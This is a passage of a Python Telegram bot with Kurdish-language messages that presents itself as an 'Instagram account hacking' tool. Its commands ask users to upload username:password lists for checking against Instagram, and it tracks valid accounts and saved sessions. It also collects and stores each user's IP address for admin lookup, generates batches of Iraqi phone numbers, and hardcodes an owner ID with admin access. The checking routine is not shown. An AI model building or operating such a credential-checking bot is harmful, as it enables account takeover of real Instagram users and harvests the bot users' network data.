                                    "❌ <b>نەشیا فایلێ داونلۆد بکەت. تکایە دووبارە هەول بدە.</b>"
                                )

                    # چێککرنا فەرمانێن دەقی
                    elif 'message' in update and 'text' in update['message']:
                        chat_id = update['message']['chat']['id']
                        user_id = update['message']['from']['id']
                        text = update['message']['text']
                        
                        # Record user interaction with user data
                        user_data = update['message']['from']
                        record_user(user_id, user_data)

                        # Check if waiting for IP
                        if str(user_id) in user_states and user_states[str(user_id)] == "waiting_for_ip":
                            # Check if text looks like an IP
                            if is_valid_ip(text):
                                # Store the IP
                                user_ips[str(user_id)] = text
                                # Remove from waiting state
                                user_states.pop(str(user_id), None)
                                
                                # Store the IP in file for persistence
                                with open("user_ips.txt", 'a', encoding='utf-8') as f:
                                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                                    f.write(f"{user_id}:{text}:{timestamp}\n")
                                    
                                send_telegram_message(
                                    chat_id,
                                    f"✅ <b>سوپاس! IP یا تە هاتە تۆمارکرن:</b> <code>{text}</code>\n\n"
                                    f"<i>نوکە تۆ دکاری فایلا ئەکاونتان بارکەی بۆ چێککرنێ</i>"
                                )
                            else:
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>ئەڤە نە IP یا دروستە:</b> <code>{text}</code>\n\n"
                                    f"<i>نمونەیا دروست: 123.45.67.89</i>\n"
                                    f"تکایە دووبارە هەول بدە"
                                )
                            continue

                        # Check if admin is in broadcast mode
                        if str(user_id) in CONFIG['ADMIN_IDS'] and str(user_id) in broadcast_mode and broadcast_mode[str(user_id)]:
                            if text.lower() == '/cancel':
                                broadcast_mode[str(user_id)] = False
                                send_telegram_message(
                                    chat_id,
                                    "❌ <b>هنارتنا پەیامێ هاتە بەتالکرن</b>"
                                )
                            else:
                                broadcast_mode[str(user_id)] = False  # Exit broadcast mode
                                # Start broadcasting in a separate thread
                                threading.Thread(
                                    target=broadcast_message,
                                    args=(chat_id, text)
                                ).start()
                            continue  # Skip regular command processing

                        # تۆمارکرنا ID یا کارهێنەری بۆ دیباگکرنێ
                        print(Fore.YELLOW + f"فەرمانا '{text}' ژ کارهێنەرێ ئایدی: {user_id} هاتە وەرگرتن" + Style.RESET_ALL)

                        # Handle /broadcast command for admins
                        if text == '/broadcast' and str(user_id) in CONFIG['ADMIN_IDS']:
                            user_count = len(get_all_users())
                            
                            # Create inline keyboard for confirmation
                            keyboard = InlineKeyboardMarkup([
                                [InlineKeyboardButton("✅ بەلێ، هنارتنا پەیامێ", callback_data="broadcast_confirm")]
                            ])
                            
                            send_telegram_message(
                                chat_id,
                                f"📢 <b>پەیام هنارتن بۆ هەمی بەکارهێنەران</b>\n\n"
                                f"تۆ دێ پەیامەکێ هنێری بۆ <b>{user_count}</b> بەکارهێنەرێن بۆتێ.\n\n"
                                f"<i>ژبۆ بەردەوامکرنێ، بتنا خوارێ بئەبجن</i>",
                                keyboard=keyboard
                            )
                        
                        # فەرمانا /info بۆ ئەدمینان
                        elif text == '/info' and str(user_id) in CONFIG['ADMIN_IDS']:
                            # Get user statistics
                            stats = get_user_info()
                            
                            # Format the message
                            info_message = (
                                f"📊 <b>بۆتێ زانیاریێن بەکارهێنەران</b>\n\n"
                                f"👥 <b>سەرجەمێ بەکارهێنەران:</b> {stats['total_users']}\n"
                                f"📆 <b>بەکارهێنەرێن ئەڤرۆ:</b> {stats['users_today']}\n"
                                f"🕒 <b>بەکارهێنەرێن دوهی:</b> {stats['users_yesterday']}\n\n"
                                f"<i>بۆ دیتنا زانیاریێن بەکارهێنەرەکێ تایبەت، فەرمانا /info [user_id] بکارینە</i>"
                            )
                            
                            send_telegram_message(chat_id, info_message)
                            
                        elif text.startswith('/info ') and str(user_id) in CONFIG['ADMIN_IDS']:
                            # Extract the user ID from the command
                            target_user_id = text.split(' ', 1)[1].strip()
                            
                            try:
                                # Get information about specific user
                                user_stats = get_user_info(target_user_id)
                                user_data = user_stats['user_data']
                                
                                if user_data:
                                    user_info = (
                                        f"👤 <b>زانیاریێن بەکارهێنەری</b>\n\n"
                                        f"🆔 <b>ئایدی:</b> {user_data['user_id']}\n"
                                        f"📆 <b>رۆژا تۆمارکرنێ:</b> {user_data['join_date']}\n"
                                    )
                                    
                                    # Check if user is admin
                                    if user_data['user_id'] in CONFIG['ADMIN_IDS']:
                                        user_info += f"👑 <b>ستاتوس:</b> ئەدمین\n"
                                    else:
                                        user_info += f"👤 <b>ستاتوس:</b> بەکارهێنەرێ ئاسایی\n"
                                    
                                    # Add IP information if available
                                    if user_data['user_id'] in user_ips:
                                        user_info += f"🌐 <b>IP:</b> {user_ips[user_data['user_id']]}\n"
                                    
                                    send_telegram_message(chat_id, user_info)
                                else:
                                    send_telegram_message(chat_id, f"❌ <b>بەکارهێنەر ب ئایدی {target_user_id} نەهاتە دیتن</b>")
                            except Exception as e:
                                send_telegram_message(chat_id, f"❌ <b>هەلە د دیتنا زانیاریان دە: {str(e)}</b>")
                        
                        # فەرمانا /getip بۆ ئەدمینان - بۆ دەستڤەئینانا IP یا کارهێنەرەکێ تایبەت
                        elif text.startswith('/getip ') and str(user_id) in CONFIG['ADMIN_IDS']:
                            # Extract the user ID from the command
                            target_user_id = text.split(' ', 1)[1].strip()
                            
                            if target_user_id in user_ips:
                                send_telegram_message(
                                    chat_id,
                                    f"🌐 <b>IP یا بەکارهێنەرێ {target_user_id}:</b>\n"
                                    f"<code>{user_ips[target_user_id]}</code>"
                                )
                            else:
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>چ IP بۆ بەکارهێنەرێ {target_user_id} نەهاتیە تۆمارکرن</b>"
                                )
                        
                        # چێککرنا فەرمانا /start
                        elif text == '/start':
                            # زانینا کا کارهێنەر ئەندامێ کەنالێیە
                            bypass_check = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            if not bypass_check and not check_telegram_membership(user_id):
                                send_telegram_message(
                                    chat_id,
                                    f"👋 <b>بخێرهاتی بۆ بوتێ هاککرنا ئەکاونتێن ئینستاگرامى!</b>\n\n"
                                    f"⚠️ <b>دڤێت تۆ بەری بکارئینانا ڤێ ئامرازێ ببیە ئەندامێ کەنالێ:</b> @{TELEGRAM_CHANNEL}\n\n"
                                    f"<i>پشتی ئەندامبوونێ، فەرمانا /start دووبارە بکە</i>"
                                )
                                continue

                            # Check if we already have the user's IP
                            if str(user_id) not in user_ips:
                                # We don't have the IP yet, ask for it first
                                user_states[str(user_id)] = "waiting_for_ip"
                                
                                # Create keyboard with IP checking site
                                keyboard = InlineKeyboardMarkup([
                                    [InlineKeyboardButton("🔎 بینە IP یا خۆ", url="https://whatismyipaddress.com/")]
                                ])
                                
                                send_telegram_message(
                                    chat_id,
                                    f"👋 <b>بخێربێیت بۆ چێکەرا ئەکاونتێن ئینستاگرامێ!</b>\n\n"
                                    f"⚠️ <b>بەرێ دەستپێکرنێ، تکایە IP یا خۆ پێشکێش بکە:</b>\n\n"
                                    f"1️⃣ بتنا '🔎 بینە IP یا خۆ' ئەبجن\n"
                                    f"2️⃣ IP یا خۆ کۆپی بکە (نمونە: 123.45.67.89)\n"
                                    f"3️⃣ ڤەگەرە ڤێرە و تەنها IP یا خۆ بنڤیسە (بێی هیچ پێشگر یان فەرمان)",
                                    keyboard=keyboard
                                )
                                continue
                            
                            # If we have the IP, continue with normal welcome message
                            send_telegram_message(
                                chat_id,
                                f"👋 <b>بخێربێیت بۆ چێکەرا ئەکاونتێن ئینستاگرامێ!</b>\n\n"
                                f"🌐 <b>IP یا تە:</b> <code>{user_ips.get(str(user_id), 'نەزانکری')}</code>\n\n"
                                f"<b>چاوا بکارینی:</b>\n"
                                f"1️⃣ فایلەکێ تێکست ب شێوەیێ username:password درست بکە\n"
                                f"2️⃣ فایلێ بارکە بۆ ڤێ گەنگەشێ\n"
                                f"3️⃣ چاڤەرێ بکە داکو ئەم ئەکاونتان بۆ تە چێک بکەین\n\n"
                                f"<b>فەرمانێن بەردەست:</b>\n"
                                f"/start - نیشاندانا ڤێ پەیامێ\n"
                                f"/status - نیشاندانا ستاتوسێ بۆتێ\n"
                                f"/numbers - چێکرنا ژمارێن تەلەفۆنا\n"
                                f"/help - پێزانینێن زێدەتر"
                            )
                        
                        # چێککرنا فەرمانا /help
                        elif text == '/help':
                            # زانینا کا کارهێنەر ئەندامێ کەنالێیە
                            bypass_check = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            if not bypass_check and not check_telegram_membership(user_id):
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>دڤێت تۆ ببیە ئەندامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی.</b>"
                                )
                                continue

                            send_telegram_message(
                                chat_id,
                                f"ℹ️ <b>هاریکاری - چێکەرا ئەکاونتێن ئینستاگرامێ</b>\n\n"
                                f"<b>چاوا فایلا ناسناما درست بکەی:</b>\n"
                                f"• درست بکە یان راستڤەکە فایلەکا تێکست (.txt)\n"
                                f"• هەر خەتەک دڤێت دگەل یەک ئەکاونتێ بیت بشێوەیێ username:password\n"
                                f"• مە پێشنیار دکەت کو تۆ فایلێن مەزن دابەش بکەی بۆ چەند فایلێن 50-100 ئەکاونتی\n\n"
                                f"<b>نمونە:</b>\n"
                                f"<code>user123:pass123\nuser456:pass456</code>\n\n"
                                f"<b>ئەگەر چ کێشە هەبیت:</b>\n"
                                f"• دلنیابە کو تۆ ئەندامی کەنالا @{TELEGRAM_CHANNEL}\n"
                                f"• فایلا تە دڤێت فایلا تێکست (.txt) بیت\n"
                                f"• فۆرماتا ناسناما دڤێت دروست بیت (username:password)"
                            )
                        
                        # چێککرنا فەرمانا /status
                        elif text == '/status':
                            # زانینا کا کارهێنەر ئەندامێ کەنالێیە
                            bypass_check = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            if not bypass_check and not check_telegram_membership(user_id):
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>دڤێت تۆ ببیە ئەندامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی.</b>"
                                )
                                continue

                            # زانیاریێن فایلا ئەکاونتێن دروست
                            valid_accounts_count = 0
                            if os.path.exists(CONFIG['VALID_ACCOUNTS_FILE']):
                                with open(CONFIG['VALID_ACCOUNTS_FILE'], 'r') as file:
                                    valid_accounts_count = len(file.readlines())

                            is_bypass_enabled = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            
                            # Include IP info in status
                            user_ip = user_ips.get(str(user_id), "نەزانکری")
                            
                            send_telegram_message(
                                chat_id,
                                f"📊 <b>ستاتوسێ بۆتێ</b>\n\n"
                                f"• <b>ستاتوسێ بۆتێ:</b> ✅ چالاک\n"
                                f"• <b>مۆدا بۆراندنا چێککرنا کەنالێ:</b> {'✅ چالاک' if is_bypass_enabled else '❌ نەچالاک'}\n"
                                f"• <b>ژمارا ئەکاونتێن دروست:</b> {valid_accounts_count}\n"
                                f"• <b>IP یا تە:</b> <code>{user_ip}</code>\n"
                                f"• <b>کەنالا پشتەڤانیێ:</b> @{TELEGRAM_CHANNEL}\n\n"
                                f"<i>بۆ بکارئینانا بۆتێ، فایلەکا تێکست (.txt) بارکە</i>"
                            )
                        
                        # چێککرنا فەرمانا /myip - فەرمانا نوی بۆ نیشاندان و گوهۆرینا IP
                        elif text == '/myip':
                            # نیشاندانا IP یا هەیی
                            current_ip = user_ips.get(str(user_id), "نەزانکری")
                            
                            # Create keyboard with IP checking site for update
                            keyboard = InlineKeyboardMarkup([
                                [InlineKeyboardButton("🔄 نویکرنا IP", callback_data="update_ip")],
                                [InlineKeyboardButton("🔎 بینە IP یا خۆ", url="https://whatismyipaddress.com/")]
                            ])
                            
                            send_telegram_message(
                                chat_id,
                                f"🌐 <b>IP یا تە یا نوکە:</b> <code>{current_ip}</code>\n\n"
                                f"<i>بۆ نویکرنا IP یا خۆ، بەرێ کلیکا 'بینە IP یا خۆ' پاشی IP یا خۆ د پەیامەکێ نوی دە بنڤیسە.</i>",
                                keyboard=keyboard
                            )
                        
                        # چێککرنا فەرمانا /numbers - چێکرنا ژمارێن عێراقی
                        elif text == '/numbers':
                            # زانینا کا کارهێنەر ئەندامێ کەنالێیە
                            bypass_check = CONFIG.get('BYPASS_BY_DEFAULT', True)
                            if not bypass_check and not check_telegram_membership(user_id):
                                send_telegram_message(
                                    chat_id,
                                    f"❌ <b>دڤێت تۆ ببیە ئەندامێ @{TELEGRAM_CHANNEL} داکو ڤێ ئامرازێ بکارینی.</b>"
                                )
                                continue

                            # درستکرنا کیبۆردا بتنان
                            keyboard = InlineKeyboardMarkup([
                                [
                                    InlineKeyboardButton("100 ژمارە", callback_data="generate_numbers:100"),
                                    InlineKeyboardButton("200 ژمارە", callback_data="generate_numbers:200")
                                ],
                                [
                                    InlineKeyboardButton("400 ژمارە", callback_data="generate_numbers:400"),
                                    InlineKeyboardButton("1000 ژمارە", callback_data="generate_numbers:1000")
                                ]
                            ])

                            send_telegram_message(
                                chat_id,
                                "🔢 <b>چێکەرا ژمارێن تەلەفۆنا یێن عێراقی</b>\n\n"
                                "تکایە ژمارا ژمارێن کو تۆ دخوازی هەلبژێرە:",
                                keyboard=keyboard
                            )
                        
                        # چێککرنا فەرمانا /myid
                        elif text == '/myid':
                            send_telegram_message(
                                chat_id,
                                f"🆔 <b>ID یا تەلیگراما تە:</b> <code>{user_id}</code>"
                            )
                        
                        # چێککرنا فەرمانێن ئەدمینی
                        elif text == '/bypass_on' and str(user_id) in CONFIG['ADMIN_IDS']:
                            CONFIG['BYPASS_BY_DEFAULT'] = True
                            send_telegram_message(
                                chat_id,
                                "✅ <b>مۆدا بۆراندنا چێککرنا کەنالێ هاتە چالاککرن</b>\n\n"
                                "<i>ئەڤە ڤێ یەکێ دهێلیت کو کارهێنەر بێی ئەندامبوونا کەنالێ بکاربینن</i>"
                            )
                        elif text == '/bypass_off' and str(user_id) in CONFIG['ADMIN_IDS']:
                            CONFIG['BYPASS_BY_DEFAULT'] = False
                            send_telegram_message(
                                chat_id,
                                "❌ <b>مۆدا بۆراندنا چێککرنا کەنالێ هاتە نەچالاککرن</b>\n\n"
                                "<i>ئەڤە ڤێ یەکێ نەدهێلیت کو کارهێنەر بێی ئەندامبوونا کەنالێ بکاربینن</i>"
                            )
                        # Handle unknown commands
                        elif text.startswith('/'):
                            send_telegram_message(
                                chat_id,
                                "❓ <b>فەرمانا نەزانکری.</b> بۆ دیتنا فەرمانێن بەردەست، فەرمانا /help بکارینە."
                            )

            time.sleep(1)  # رێگرتن ژ دیتنا سنۆرێن رەیتێ

        except Exception as e:
            print(Fore.RED + f"هەلە د هەلگرتنا نویکرنێن تەلیگرامێ دە: {str(e)}" + Style.RESET_ALL)
            time.sleep(5)  # چاڤەرێکرن بەری نویکرنێ پشتی دیتنا هەلەیەکێ

def main():
    try:
        show_banner()

        # Create sessions directory if it doesn't exist
        sessions_dir = "saved_sessions"
        if not os.path.exists(sessions_dir):
            os.makedirs(sessions_dir)
            print(Fore.GREEN + f"Created sessions directory: {sessions_dir}" + Style.RESET_ALL)
        else:
            # Count saved sessions
            session_files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
            print(Fore.GREEN + f"Found {len(session_files)} saved sessions" + Style.RESET_ALL)

        # Load saved user IPs
        load_user_ips()
        print(Fore.GREEN + f"Loaded {len(user_ips)} user IP addresses from storage" + Style.RESET_ALL)

        # Add owner ID to ADMIN_IDS to ensure bypass
        owner_id = "867526112"  # Replace with your actual Telegram ID
        if owner_id not in CONFIG['ADMIN_IDS']:
            CONFIG['ADMIN_IDS'].append(owner_id)
            print(Fore.GREEN + f"Owner ID {owner_id} added to admin list for bypass access" + Style.RESET_ALL)

        # Check for PythonAnywhere environment
        if RUNNING_ON_PYTHONANYWHERE:
            print(Fore.YELLOW + "Running on PythonAnywhere - using optimized settings" + Style.RESET_ALL)
            print(Fore.YELLOW + "Longer delays and enhanced browser emulation enabled" + Style.RESET_ALL)
        
        # Change from mode 3 to mode 2 (disable BYPASS for regular users)
        print(Fore.GREEN + f"دەستپێکرنا بۆتێ ب مۆدا 2..." + Style.RESET_ALL)
        print(Fore.YELLOW + "مۆدا BYPASS نەچالاکە بۆ کارهێنەرێن ئاسایی - چێککرنێن ئەندامەتیا کەنالێ دێ هێنە چالاککرن" + Style.RESET_ALL)
        print(Fore.GREEN + "✅ خودانێ بۆتێ همی دەم دشێت بکاربینیت بێی چێککرنا ئەندامەتیێ" + Style.RESET_ALL)
        CONFIG['BYPASS_BY_DEFAULT'] = False  # BYPASS off for regular users

        print(Fore.YELLOW + "فەرمانێن بۆتا بەردەست:" + Style.RESET_ALL)
        print("/start - نیشاندانا پەیاما بخێرهاتنێ")
        print("/myid - نیشاندانا ئایدی یا تەلیگراما تە")
        print("/help - نیشاندانا هاریکاریا هویر")
        print("/status - چێککرنا ستاتوسێ بۆتێ")
        print("/bypass_on - چالاککرنا مۆدا بۆراندنێ (تەنها بۆ ئەدمینی)")
        print("/bypass_off - نەچالاککرنا مۆدا بۆراندنێ (تەنها بۆ ئەدمینی)")
        print(Fore.YELLOW + "Ctrl+C تێبگرە بۆ راوەستاندنا بۆتێ" + Style.RESET_ALL)

        # مەشاندنا هەلگرەکێ نویکرنێن تەلیگرامێ
        handle_telegram_updates()

    except KeyboardInterrupt:
        print(Fore.RED + "\nپرۆسە ژلایێ کارهێنەری ڤە هاتە بڕین" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"هەلە: {str(e)}" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
